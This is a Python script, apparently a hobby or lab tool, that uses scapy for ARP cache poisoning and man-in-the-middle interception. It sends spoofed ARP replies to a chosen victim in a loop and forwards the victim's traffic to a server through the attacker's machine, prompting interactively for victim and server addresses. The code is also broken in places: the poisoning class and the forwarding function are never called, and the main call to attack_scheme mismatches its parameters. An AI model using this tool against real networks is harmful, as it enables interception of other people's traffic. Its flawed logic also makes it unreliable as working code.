import scapy.all as scapy
import time
import sys
import re
import ipaddress

class ARP_Poisoning:
    def __init__(self, iface, packet_interval, victim_mac, victim_ip, ip_to_spoof, attacker_mac, attacker_ip):
        self.iface = iface
        self.packet_interval = packet_interval
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.ip_to_spoof = ip_to_spoof
        self.attacker_mac = attacker_mac
        self.attacker_ip = attacker_ip
    
    def run(self):
        try:
            while True:
                # sending spoofed ARP packet to the victim (unsolicited arp reply)
                arp_reply = scapy.Ether(src=self.attacker_mac) / scapy.ARP(op=2, psrc=self.ip_to_spoof, hwsrc=self.attacker_mac ,pdst=self.victim_ip, hwdst=self.victim_mac)
                scapy.sendp(arp_reply, verbose=False, iface=self.iface)
                time.sleep(self.packet_interval)
        except KeyboardInterrupt:
            print("Stopping ARP poisoning")

def classify_address(address):
    """
    Classify a string as MAC address, IP address, or neither.
    
    Args:
        address (str): The address string to classify
    
    Returns:
        str: "MAC", "IP", or "ERROR"
    """
    if not isinstance(address, str):
        return "ERROR"

    
    # remove any whitespace
    address = address.strip()
    
    if not address:
        return "ERROR"
    
    # check for MAC address (colon-separated format only: XX:XX:XX:XX:XX:XX)
    mac_pattern = r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
    if re.match(mac_pattern, address):
        return "MAC"
    
    try:
        ipaddress.ip_address(address)
        return "IP"
    except (ValueError, AttributeError):
        pass
    
    # if neither MAC nor IP
    return "ERROR"

def get_mac_addr(ip):
    
    arp_req_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    answered, unanswered = scapy.srp(arp_req_pkt, timeout=1, verbose=False)

    if answered:
        return answered[0][1].hwsrc

    print("failed to get MAC address for IP:", ip)
    return None

def forward_packet(pkt, victim_ip, server_ip, victim_mac, server_mac, attacker_mac):
    
    if pkt.haslayer(scapy.IP):

        ip = pkt[scapy.IP]

        # if the packet is from the victim to the server
        if ip.src == victim_ip:

            # forward the packet to the server
            pkt[scapy.Ether].dst = server_mac
            pkt[scapy.Ether].src = attacker_mac
            scapy.sendp(pkt, verbose=False)

        # if the packet is from the server to the victim
        elif ip.src == server_ip:

            # forward the packet to the victim
            pkt[scapy.Ether].dst = victim_mac
            pkt[scapy.Ether].src = attacker_mac
            scapy.sendp(pkt, verbose=False)

def attack_scheme(iface, victim_ip, victim_mac, ip_to_spoof, server_mac, packet_forwarding=False):
    """
    Perform ARP poisoning attack.
    """
    
    if not server_mac:
        server_mac = get_mac_addr(server_ip)

    print(f" Victim is at {victim_mac}")
    print(f" Server {server_ip} is at {server_mac}")

    

    # restoring the victim's ARP cache
    arp_victim = scapy.ARP(op=2, psrc=server_ip, hwsrc=server_mac, pdst=victim_ip, hwdst=victim_mac)
    scapy.send(arp_victim, verbose=False)

    if packet_forwarding:
        # restoring the server's ARP cache
        arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=victim_mac, pdst=server_ip, hwdst=server_mac)
        scapy.send(arp_server, verbose=False)

if __name__ == "__main__":
    # default
    packet_forwarding = False
    victim_ip = None
    victim_mac = None
    server_ip = None
    server_mac = None

    # ask user if they want to run a full MITM attack
    simple = input("Do you want to run ARP poisoning with packet forwarding to server (MITM)? (y/N): ").strip().lower()
    if simple not in ['y', 'yes', 'n', 'no']:
        print("Invalid input. Please enter 'y' or 'n'.")
        sys.exit(1)
    elif simple in ['n', 'no']:
        print("Running ARP poisoning without packet forwarding.")
    else:
        packet_forwarding = True
        print("Running ARP poisoning with packet forwarding.")
    
    # ask user for victim's MAC address
    victim_input = input("Enter the victim's IP or MAC address: ")
    if (classify_address(victim_input) == "MAC"):
        victim_mac = victim_input.strip()
    elif (classify_address(victim_input) == "IP"):
        victim_ip = victim_input.strip()
        victim_mac = get_mac_addr(victim_ip)
    else:
        print("Invalid address. Please enter a valid IP or MAC address.")
        sys.exit(1)

    # ask user for server's IP and MAC address
    server_ip = input("Enter the server's IP address: ").strip()
    if classify_address(server_ip) != "IP":
        print("Invalid server IP address. Please enter a valid IP address.")
        sys.exit(1)
    if (packet_forwarding):
        server_mac = input("Enter the server's MAC address (press Enter to skip): ").strip()
        if server_mac != "" and classify_address(server_mac) != "MAC":
            print("Invalid server MAC address. Please enter a valid MAC address.")
            sys.exit(1)

    attack_scheme(victim_mac, server_ip, server_mac, packet_forwarding)
    
    

    

    